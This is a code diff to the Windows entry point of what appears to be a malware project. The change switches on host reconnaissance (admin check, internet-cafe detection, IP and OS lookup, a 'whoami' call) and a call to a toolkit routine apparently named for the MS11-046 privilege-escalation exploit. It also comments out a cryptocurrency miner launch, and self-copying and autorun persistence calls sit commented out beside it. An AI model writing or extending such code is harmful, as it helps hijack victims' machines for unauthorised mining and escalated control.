@@ -21,9 +21,7 @@ DWORD WINAPI myFunc(LPVOID lpParam)
 
 int APIENTRY wWinMain(_In_ HINSTANCE hInstance,	_In_opt_ HINSTANCE hPrevInstance,
 					_In_ LPWSTR    lpCmdLine,	_In_ int nCmdShow)
-{
-	LPWSTR *argvW;
-	
+{	
 	//char **argv = (char**)malloc(argc * sizeof(char *) + 1);
 	//memset(argv, '0', argc * sizeof(char *) + 1);
 	
@@ -32,16 +30,32 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,	_In_opt_ HINSTANCE hPrevInstance
 	//argvW2A(argv, argvW, argc);
 
 
+	CSysInfo info;
+	if (info.IsRunAsAdmin())
+	{
+		printf("[+] Admin\n");
+	}
+	else
+	{
+		printf("[-] NonAdmin\n");
+	}
+	info.IsNetBar();
+	info.GetIPInfo();
+	info.GetOSInfo();
+
+	system("whoami");
 	
+	CToolKit kit;
+	kit.execExp(CToolKit::EXP_MS_11046);
+	kit.IsKeyEdit();
 	
-	////CToolKit kit;
-	////kit.execExp(CToolKit::EXP_MS_11046);
+	//kit.setAutoRun();
+	//kit.copySelf();
+	
 
-	//SysConfig();
 
-
-	App minerApp(0, NULL); //伪参数
-	StartMiner(minerApp);
+	//App minerApp(0, NULL); //伪参数
+	//StartMiner(minerApp);
 
 	MSG msg;
 	while (GetMessage(&msg, NULL, 0, 0))
@@ -75,7 +89,7 @@ BOOL StartMiner(App& minerApp)
 	}
 	
 	//防止miner被函数结束而释放
-	Sleep(1000);
+	Sleep(500);
 	
 	return TRUE;
 }
